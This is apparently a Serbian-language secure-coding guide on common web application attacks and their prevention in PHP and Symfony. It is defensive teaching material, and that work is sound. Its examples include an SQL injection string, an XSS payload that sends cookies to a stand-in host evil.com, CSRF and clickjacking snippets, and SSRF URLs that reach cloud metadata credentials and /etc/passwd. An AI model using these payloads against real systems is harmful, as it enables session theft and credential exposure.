Web aplikacije suočavaju se sa mnogo vrsta napada. Evo najčešćih, kako funkcionišu i kako ih sprečiti.

### SQL Injekcija

Napadač ubacuje SQL kod u polja korisničkog unosa da bi manipulisao upitima baze podataka.

#### Kako funkcioniše

```php
// Ranjivi kod
$email = $_POST['email'];
$query = "SELECT * FROM users WHERE email = '$email'";

// Napadač unosi: ' OR '1'='1' --
// Rezultujući upit: SELECT * FROM users WHERE email = '' OR '1'='1' --'
// Ovo vraća SVE korisnike iz baze podataka
```

#### Prevencija

```php
// Koristite prepared statements (parametrizovane upite)
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = :email");
$stmt->execute(['email' => $email]);

// Sa Doctrine ORM — već bezbedno
$user = $repository->findOneBy(['email' => $email]);

// Sa Doctrine DQL — koristite parametre
$query = $em->createQuery('SELECT u FROM User u WHERE u.email = :email');
$query->setParameter('email', $email);
```

**Pravilo:** Nikada ne stavljajte korisnički unos direktno u string SQL upita.

---

### Cross-Site Scripting (XSS)

Napadač ubacuje JavaScript kod u web stranicu koju će videti drugi korisnici.

#### Tipovi

1. **Skladišteni XSS** — zlonamerna skripta se čuva u bazi podataka (npr. u komentaru) i prikazuje svim korisnicima
2. **Reflektovani XSS** — zlonamerna skripta je u URL-u i reflektuje se nazad u odgovor
3. **DOM-bazirani XSS** — skripta se izvršava putem JavaScript-a na strani klijenta

#### Kako funkcioniše

```php
// Ranjivo — izlaz korisničkih podataka bez eskejpiranja
echo "<h1>Hello, " . $_GET['name'] . "</h1>";

// Napadač šalje: ?name=<script>document.location='http://evil.com/?c='+document.cookie</script>
// Skripta se izvršava u pretraživaču žrtve i krade njene kolačiće
```

#### Prevencija

```php
// Eskejpiranje izlaza
echo "<h1>Hello, " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') . "</h1>";

// U Twig šablonima — automatsko eskejpiranje je podrazumevano uključeno
{{ user.name }}  {# automatski eskejpirano #}
{{ user.bio|raw }}  {# NIJE eskejpirano — koristite samo kada verujete sadržaju #}
```

Takođe postavite ova HTTP zaglavlja:

```text
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
```

---

### Cross-Site Request Forgery (CSRF)

Napadač vara prijavljenog korisnika da izvrši akciju na veb sajtu bez njegovog znanja.

#### Kako funkcioniše

1. Korisnik je prijavljen na svoju banku na `bank.com`
2. Korisnik poseti zlonamernu stranicu koja sadrži:

```html
<img src="https://bank.com/transfer?to=attacker&amount=1000">
```

1. Pretraživač šalje zahtev na `bank.com` sa korisničkim kolačićima → transfer se dešava

#### Prevencija

```php
// 1. CSRF tokeni — uključite jedinstveni token u svaki obrazac
<form method="POST">
    <input type="hidden" name="_token" value="{{ csrf_token('form') }}">
    <!-- polja obrasca -->
</form>

// Server verifikuje token
if (!$this->isCsrfTokenValid('form', $request->get('_token'))) {
    throw new AccessDeniedHttpException('Invalid CSRF token');
}

// 2. SameSite kolačići
session.cookie_samesite = "Lax"  // ili "Strict"
```

> Vidi takođe: [Šta je CSRF](csrf.sr.md) za detaljnije objašnjenje.

---

### Clickjacking

Napadač učitava vaš veb sajt unutar nevidljivog iframe-a na svojoj stranici. Kada korisnik klikne na napadačevu stranicu, zapravo klikće na vaš veb sajt.

#### Kako funkcioniše

```html
<!-- Napadačeva stranica -->
<style>
    iframe { opacity: 0; position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
</style>
<p>Klikni ovde da osvoji nagradu!</p>
<iframe src="https://bank.com/transfer?to=attacker&amount=1000"></iframe>
```

#### Prevencija

```text
# HTTP Zaglavlja
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
```

```php
// U Symfony-ju
$response->headers->set('X-Frame-Options', 'DENY');
```

---

### Napad Grubom Silom (Brute Force)

Napadač pokušava mnogo lozinki (ili korisničkih imena) da bi dobio pristup nalogu.

#### Kako funkcioniše

```text
POST /login  email=admin@site.com&password=123456
POST /login  email=admin@site.com&password=password
POST /login  email=admin@site.com&password=admin123
... hiljade pokušaja više
```

#### Prevencija

```php
// Ograničenje brzine
use Symfony\Component\RateLimiter\RateLimiterFactory;

public function login(Request $request, RateLimiterFactory $loginLimiter): Response
{
    $limiter = $loginLimiter->create($request->getClientIp());

    if (!$limiter->consume(1)->isAccepted()) {
        return new JsonResponse(['error' => 'Too many attempts. Try again later.'], 429);
    }

    // ... nastavi sa prijavom
}
```

Ostale zaštite:

- Blokada naloga nakon N neuspelih pokušaja
- CAPTCHA nakon neuspelih pokušaja
- Dvofaktorska autentikacija (2FA)
- Zahtevajte jake lozinke

---

### Server-Side Request Forgery (SSRF)

Napadač tera server da šalje HTTP zahteve internim resursima koji nisu trebali biti dostupni spolja.

#### Kako funkcioniše

```php
// Ranjivo — preuzmi bilo koji URL koji korisnik pruži
$url = $_GET['url'];
$content = file_get_contents($url);

// Napadač šalje: ?url=http://localhost:6379/  → pristup internom Redis-u
// Napadač šalje: ?url=http://169.254.169.254/latest/meta-data/  → pristup AWS kredencijalima
// Napadač šalje: ?url=file:///etc/passwd  → čitanje lokalnih fajlova
```

#### Prevencija

```php
function fetchExternalUrl(string $url): string
{
    $parsed = parse_url($url);

    // Dozvolite samo HTTPS
    if ($parsed['scheme'] !== 'https') {
        throw new InvalidArgumentException('Only HTTPS allowed');
    }

    // Blokirajte interne IP adrese
    $ip = gethostbyname($parsed['host']);
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        throw new InvalidArgumentException('Internal addresses not allowed');
    }

    // Whitelist dozvoljenih domena
    $allowed = ['api.trusted-service.com'];
    if (!in_array($parsed['host'], $allowed)) {
        throw new InvalidArgumentException('Domain not allowed');
    }

    return file_get_contents($url);
}
```

---

### Otmica Sesije (Session Hijacking)

Napadač krade ID sesije korisnika da bi se lažno predstavio.

#### Kako funkcioniše

1. Napadač dobija ID sesije putem XSS-a, njuškanja mreže ili fiksacije sesije
2. Napadač šalje zahteve sa ukradenim ID-om sesije
3. Server misli da je napadač legitimni korisnik

#### Prevencija

```php
// Bezbedna konfiguracija sesije (php.ini ili Symfony konfiguracija)
session.cookie_httponly = 1      // JavaScript ne može čitati kolačić
session.cookie_secure = 1       // Kolačić se šalje samo putem HTTPS-a
session.cookie_samesite = "Lax" // Kolačić se ne šalje sa zahtevima između sajtova
session.use_strict_mode = 1     // Odbaci neinicijalizovane ID-ove sesija

// Regenerišite ID sesije nakon prijave
session_regenerate_id(true);

// U Symfony-ju
$request->getSession()->migrate(true);
```

### Tabela Sažetka Prevencije

| Napad | Glavna Prevencija |
|-------|------------------|
| SQL Injekcija | Prepared statements / parametrizovani upiti |
| XSS | Eskejpiranje izlaza, zaglavlje Content-Security-Policy |
| CSRF | CSRF tokeni, SameSite kolačići |
| Clickjacking | X-Frame-Options: DENY |
| Brute Force | Ograničenje brzine, blokada naloga, 2FA |
| SSRF | Validacija URL-a, whitelist, blokiraj interne IP adrese |
| Otmica Sesije | HttpOnly + Secure kolačići, regeneracija sesije |

### Realni Scenario

Tokom pregleda koda, pronalazite ove probleme u PHP aplikaciji:

```php
// Problem 1: SQL Injekcija
$products = $db->query("SELECT * FROM products WHERE name LIKE '%{$_GET['search']}%'");
// Popravka: Koristite prepared statement sa vezivanjem parametara

// Problem 2: XSS
echo "Welcome, " . $_SESSION['username'];
// Popravka: echo "Welcome, " . htmlspecialchars($_SESSION['username'], ENT_QUOTES, 'UTF-8');

// Problem 3: Nema CSRF zaštite na obrascu koji menja korisnički email
<form method="POST" action="/change-email">
    <input name="email" value="">
    <button>Change</button>
</form>
// Popravka: Dodajte skriveno polje CSRF tokena i verifikujte ga na serveru

// Problem 4: Nema ograničenja brzine na reset lozinke
// Popravka: Dodajte rate limiter — max 3 zahteva za reset lozinke na sat po email-u
```

Svaka popravka je mala, ali sprečava ozbiljnu ranjivost.

### Zaključak

Najčešći napadi na web aplikacije su SQL injekcija, XSS, CSRF, clickjacking, brute force, SSRF i otmica sesije. Svaki ima jasne metode prevencije: koristite prepared statements za SQL, eskejpujte izlaz za XSS, koristite tokene za CSRF, postavljajte bezbednosna zaglavlja za clickjacking, dodajte ograničenje brzine za brute force, validirajte URL-ove za SSRF i koristite bezbedna podešavanja kolačića za zaštitu sesije.

> Vidi takođe: [OWASP Top 10](owasp_top_10.sr.md), [Šta je CSRF](csrf.sr.md), [Šta je CORS](cors.sr.md)
